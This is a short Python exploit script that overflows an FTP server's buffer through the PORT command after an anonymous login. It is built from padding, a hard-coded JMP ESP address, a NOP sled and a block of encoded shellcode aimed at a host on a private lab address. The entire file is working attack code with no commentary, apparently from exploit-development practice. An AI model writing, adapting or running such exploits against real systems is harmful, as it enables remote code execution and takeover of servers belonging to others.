#!/usr/bin/python
import sys,socket
from time import sleep
import struct
 
padding = 'A' * 2007
jmpesp = struct.pack("<I",0x75B25B5F)     
nops = "\x90" * 20
shellcode =  ""
shellcode += "\xbe\x0b\xf0\x95\x5c\xdb\xc8\xd9\x74\x24\xf4"
shellcode += "\x5b\x29\xc9\xb1\x31\x31\x73\x13\x03\x73\x13"
shellcode += "\x83\xeb\xf7\x12\x60\xa0\xef\x51\x8b\x59\xef"
shellcode += "\x35\x05\xbc\xde\x75\x71\xb4\x70\x46\xf1\x98"
shellcode += "\x7c\x2d\x57\x09\xf7\x43\x70\x3e\xb0\xee\xa6"
shellcode += "\x71\x41\x42\x9a\x10\xc1\x99\xcf\xf2\xf8\x51"
shellcode += "\x02\xf2\x3d\x8f\xef\xa6\x96\xdb\x42\x57\x93"
shellcode += "\x96\x5e\xdc\xef\x37\xe7\x01\xa7\x36\xc6\x97"
shellcode += "\xbc\x60\xc8\x16\x11\x19\x41\x01\x76\x24\x1b"
shellcode += "\xba\x4c\xd2\x9a\x6a\x9d\x1b\x30\x53\x12\xee"
shellcode += "\x48\x93\x94\x11\x3f\xed\xe7\xac\x38\x2a\x9a"
shellcode += "\x6a\xcc\xa9\x3c\xf8\x76\x16\xbd\x2d\xe0\xdd"
shellcode += "\xb1\x9a\x66\xb9\xd5\x1d\xaa\xb1\xe1\x96\x4d"
shellcode += "\x16\x60\xec\x69\xb2\x29\xb6\x10\xe3\x97\x19"
shellcode += "\x2c\xf3\x78\xc5\x88\x7f\x94\x12\xa1\xdd\xf2"
shellcode += "\xe5\x37\x58\xb0\xe6\x47\x63\xe4\x8e\x76\xe8"
shellcode += "\x6b\xc8\x86\x3b\xc8\x26\xcd\x66\x78\xaf\x88"
shellcode += "\xf2\x39\xb2\x2a\x29\x7d\xcb\xa8\xd8\xfd\x28"
shellcode += "\xb0\xa8\xf8\x75\x76\x40\x70\xe5\x13\x66\x27"
shellcode += "\x06\x36\x05\xa6\x94\xda\xe4\x4d\x1d\x78\xf9"
 
buf = padding + jmpesp + nops + shellcode
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('10.0.2.4',21))
s.recv(1024)
s.send("USER " + "Anonymous")
s.recv(1024)
s.send("PASS pass")
s.recv(1024)        
s.send('PORT ' + buf)
s.recv(1024)
s.close()
